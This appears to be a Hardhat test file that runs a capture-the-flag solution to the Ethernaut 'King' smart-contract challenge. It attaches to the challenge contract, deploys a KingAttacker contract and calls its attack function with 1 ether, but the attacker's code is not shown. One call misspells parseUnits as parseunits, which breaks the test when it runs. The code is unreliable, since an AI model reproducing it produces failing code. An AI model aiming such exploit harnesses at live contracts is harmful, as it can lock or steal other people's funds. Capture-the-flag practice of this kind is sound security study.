import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
    accounts = await ethers.getSigners();
    [eoa] = accounts;
    const challengeFactory = await ethers.getContractFactory(`King`);
    // this address doesn't match the one on Ethernaut for some reason.
    // I grabbed this from MrToph's project because I had trouble deploying.
    // This createChallenge function is also populating the target
    // contract with exctly 1 ether.
    const challengeAddress = await createChallenge(
        `0x5cECE66f3EB19f7Df3192Ae37C27D96D8396433D`,
        //`0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5`,
        ethers.utils.parseUnits(`1`, `ether`)
    );
    challenge = await challengeFactory.attach(challengeAddress);

    const attackerFactory = await ethers.getContractFactory(`KingAttacker`);
    attacker = await attackerFactory.deploy(challenge.address);

});

it("solves the challenge", async function () {
    tx = await attacker.attack({
        value: ethers.utils.parseunits(`1`, `ether`),
    });
    await tx.wait();
});

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
